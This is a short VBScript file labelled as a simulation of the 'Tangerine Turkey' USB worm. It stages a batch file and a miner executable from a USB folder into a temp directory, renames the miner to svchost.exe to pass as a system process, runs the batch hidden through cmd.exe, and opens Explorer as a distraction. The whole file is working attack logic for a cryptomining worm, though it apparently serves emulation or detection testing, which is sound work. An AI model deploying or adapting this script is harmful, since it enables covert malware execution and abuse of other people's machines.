' Tangerine Turkey simulation - VBS USB worm
' Place under something like E:\rootdir\x123456.vbs and execute via wscript.exe

Option Explicit

Dim fso, shell, usbPath, workDir, batPath

Set fso   = CreateObject("Scripting.FileSystemObject")
Set shell = CreateObject("WScript.Shell")

' Current script folder (simulated USB rootdir)
usbPath = fso.GetParentFolderName(WScript.ScriptFullName)

' Working dir in user profile
workDir = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%") & "\TT_Sim"
If Not fso.FolderExists(workDir) Then
    fso.CreateFolder(workDir)
End If

' Copy BAT and miner stub from USB to working dir
batPath = usbPath & "\x123456.bat"
If fso.FileExists(batPath) Then
    fso.CopyFile batPath, workDir & "\x123456.bat", True
End If

If fso.FileExists(usbPath & "\miner_stub.exe") Then
    fso.CopyFile usbPath & "\miner_stub.exe", workDir & "\svchost.exe", True
End If

' Launch BAT via cmd.exe (wscript.exe -> cmd.exe -> BAT)
shell.Run "cmd.exe /c """ & workDir & "\x123456.bat""", 0, False

' Optional: open the “USB” folder to mimic distraction behavior
shell.Run "explorer.exe """ & usbPath & """", 1, False

